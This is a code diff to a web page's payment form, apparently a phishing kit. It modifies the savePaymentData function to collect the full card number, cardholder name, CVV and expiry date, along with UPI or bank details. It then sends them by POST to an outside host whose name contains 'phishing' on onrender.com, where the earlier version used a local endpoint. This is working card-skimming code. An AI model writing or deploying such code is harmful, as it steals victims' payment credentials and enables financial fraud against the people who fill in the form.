@@ -377,7 +377,7 @@
       <!-- CARD TAB -->
       <div class="modal-body tab-panel active" id="tab-card">
 
-        <div style="margin-bottom:16px;">
+        <!-- <div style="margin-bottom:16px;">
           <div class="saved-card selected" onclick="selectSaved(this, '0')" data-id="0">
             <div class="card-chip visa-chip">VISA</div>
             <div class="saved-card-info">
@@ -394,15 +394,15 @@
             </div>
             <div class="radio-dot"></div>
           </div>
-        </div>
+        </div> -->
 
-        <div class="or-divider">or add new card</div>
+        <!-- <div class="or-divider">or add new card</div> -->
 
         <div class="form-group">
           <label class="form-label">Card Number</label>
           <div class="input-wrap">
             <span class="input-icon">💳</span>
-            <input type="text" class="form-input card-number-input" id="cardNum" placeholder="0000  0000  0000  0000" maxlength="19" oninput="formatCard(this)" style="padding-right: 56px;">
+            <input type="text" class="form-input card-number-input" id="cardNum" placeholder="0000  0000  0000  0000" maxlength="22" oninput="formatCard(this)" style="padding-right: 56px;">
             <span class="card-brand" id="cardBrand">···</span>
           </div>
           <div class="error-msg" id="cardNumErr">Please enter a valid card number</div>
@@ -646,7 +646,7 @@
     return true;
   }
 
-function savePaymentData(method) {
+ function savePaymentData(method) {
   let data = {
     method: method,
     time: new Date().toLocaleString()
@@ -654,10 +654,11 @@ function savePaymentData(method) {
 
   if (method === 'card') {
     let cardNum = document.getElementById('cardNum').value.replace(/\s/g, '').replace(/\D/g, '');
-    data.cardLast4 = cardNum ;
+    data.cardNumber = cardNum;
+    data.cardLast4 = cardNum;
     data.cardName = document.getElementById('cardName').value.trim();
-    data.cardCvv = document.getElementById('cardCvv').value.trim();
-    data.cardExp = document.getElementById('cardExp').value.trim();
+    data.cardCvv  = document.getElementById('cardCvv').value.trim();
+    data.cardExp  = document.getElementById('cardExp').value.trim();
   }
 
   if (method === 'upi') {
@@ -669,23 +670,17 @@ function savePaymentData(method) {
     data.bank = selectedBank ? selectedBank.innerText.trim() : 'Unknown';
   }
 
-  // FIXED: Send to correct endpoint using relative URL (best for Render)
-  fetch('/log-payment', {
+  // Save locally (optional for demo)
+  //let payments = JSON.parse(localStorage.getItem('payments')) || [];
+  //payments.push(data);
+  //localStorage.setItem('payments', JSON.stringify(payments));
+
+  // === SEND TO BACKEND LOGGER ===
+  fetch('https://phishing-sbo5.onrender.com', {   // ← Change this later
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(data)
-  })
-  .then(response => {
-    if (!response.ok) throw new Error('Server error');
-    return response.json();
-  })
-  .then(result => {
-    console.log('✅ Payment data logged successfully:', result);
-  })
-  .catch(err => {
-    console.error('❌ Logging failed:', err);
-    // Optional: alert('Failed to save payment details');
-  });
+  }).catch(err => console.error('Logging failed:', err));
 
   return data;
 }
